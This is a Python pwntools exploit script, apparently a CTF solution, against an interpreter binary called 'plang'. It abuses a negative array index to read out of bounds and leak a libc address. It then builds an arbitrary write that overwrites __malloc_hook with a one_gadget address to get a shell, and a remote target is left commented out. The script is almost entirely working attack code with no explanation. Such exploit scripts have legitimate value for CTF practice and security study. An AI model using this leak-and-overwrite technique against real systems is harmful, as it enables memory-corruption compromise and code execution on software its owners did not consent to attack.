#!/usr/bin/python -i
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports

from pwn import *
import time
import os
import sys

elf = ""
libc = ""
env = ""
LOCAL = 1
context.log_level = "debug"

p = process("./plang")
#p = remote("111.186.63.210", 6666)

#read primitive
p.send('var b = ["a","say2","c","d","e"]\n')
p.recvuntil('> ')
p.recvuntil('> ')
p.send('b[-0xba]=100\n')
p.recvuntil('> ')
for i in range(0x128,0x128+6):
    p.send("System.print(b[1][{:d}])\n".format(i))
addrs = [p.recvuntil('> ')[:-3] for _ in range(6)]

addrs = [i if i else '\0' for i in addrs]

libc = ''.join(addrs)

libc_addr = u64(libc+"\0"*2) - 0x3ebca0
print hex(libc_addr)
# def peek(i):
#    p.send('System.print(b[-%d])\n'%i)
#    print p.recvuntil('> ')


n=0x3f8+58
def i2d(i):
    # assume i is positive
    return '%d'%i+'/8'*(n//3)+'/2'*(n%3)
    #return "%d" %i
one = libc_addr + 0x4f322
malloc_hook = libc_addr + 0x3ed8e8
addr=malloc_hook 
data=one
print hex(addr - 8)
p.interactive()
raw_input('continue ->')
p.send('b[-2]={}\n'.format(i2d(addr-8)))
raw_input('continue2 ->')
p.send('b[0]={}\n'.format(i2d(data)))



p.interactive()
